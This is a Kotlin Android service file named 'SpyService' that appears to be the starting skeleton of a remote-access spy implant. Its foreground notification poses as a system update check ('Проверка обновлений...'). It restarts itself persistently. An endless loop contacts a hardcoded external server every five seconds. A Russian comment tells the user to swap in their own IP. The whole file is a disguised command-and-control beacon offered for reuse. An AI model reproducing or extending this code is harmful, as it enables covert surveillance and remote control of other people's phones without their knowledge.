package com.ratnik.app
import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

class SpyService : Service() {
    private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
    // ЗАМЕНИ ЭТОТ IP НА СВОЙ, ЕСЛИ ЕСТЬ!
    private val serverUrl = "http://80.94.250.145:8080/ping" 

    override fun onCreate() {
        super.onCreate()
        val channelId = "ratnik_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
            val notification = Notification.Builder(this, channelId)
                .setContentTitle("Проверка обновлений...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build()
            startForeground(1, notification)
        }
        
        Thread {
            while (true) {
                try {
                    val request = Request.Builder().url(serverUrl).build()
                    client.newCall(request).execute().use { }
                } catch (e: Exception) { }
                Thread.sleep(5000)
            }
        }.start()
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
